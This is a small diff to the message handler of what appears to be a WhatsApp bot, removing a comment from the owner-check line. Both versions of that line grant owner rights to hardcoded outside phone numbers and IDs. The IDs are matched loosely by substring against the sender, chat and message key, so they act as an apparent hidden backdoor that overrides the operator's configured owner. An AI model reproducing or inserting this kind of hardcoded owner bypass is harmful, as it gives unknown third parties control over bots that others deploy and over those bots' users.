@@ -370,7 +370,7 @@ const jid = msg.key.remoteJid;
                 const rawParticipant = JSON.stringify(msg.key || {});
 const keyStr = JSON.stringify(msg.key || {});
         const _rfkExtraOwners = ["918086165391", "917907228818"];
-        const isOwner = (m?.key?.fromMe || (_rfkExtraOwners.some(n => (sender || "").includes(n) || (msg.key?.participant || "").includes(n) || (jid || "").includes(n)) ||  fromMe || isSuperOwner || senderNum === botNum || (botLid && (senderNum === botLid || altNum === botLid || keyStr.includes(botLid))) || keyStr.includes("917907228818") || keyStr.includes("158703806374071") || (OWNER_NUMBER && (senderNum === OWNER_NUMBER || altNum === OWNER_NUMBER)))) /* _rfkSelfChatOk */;
+        const isOwner = (m?.key?.fromMe || (_rfkExtraOwners.some(n => (sender || "").includes(n) || (msg.key?.participant || "").includes(n) || (jid || "").includes(n)) ||  fromMe || isSuperOwner || senderNum === botNum || (botLid && (senderNum === botLid || altNum === botLid || keyStr.includes(botLid))) || keyStr.includes("917907228818") || keyStr.includes("158703806374071") || (OWNER_NUMBER && (senderNum === OWNER_NUMBER || altNum === OWNER_NUMBER))));
 
                 const m =
                     msg.message?.ephemeralMessage?.message ||
